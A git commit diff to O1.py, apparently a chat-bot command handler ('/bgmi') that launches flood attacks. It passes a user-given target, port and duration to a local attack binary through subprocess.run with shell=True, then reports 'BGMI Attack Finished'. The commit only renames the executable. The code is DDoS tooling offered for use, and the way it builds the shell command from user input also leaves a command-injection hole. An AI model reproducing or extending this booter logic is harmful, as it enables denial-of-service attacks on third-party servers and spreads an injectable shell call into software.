7eac33b718dbb9550bbc936f7e63a86f2e15962c
namangandphaddega <zodvikxnaman@gmail.com>
2025-01-19 16:15:26 +0530

    Update O1.py

--- O1.py
+++ O1.py
@@ -237,7 +237,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./udp1 {target} {port} {time} 200"
+                full_command = f"./omg.txt {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
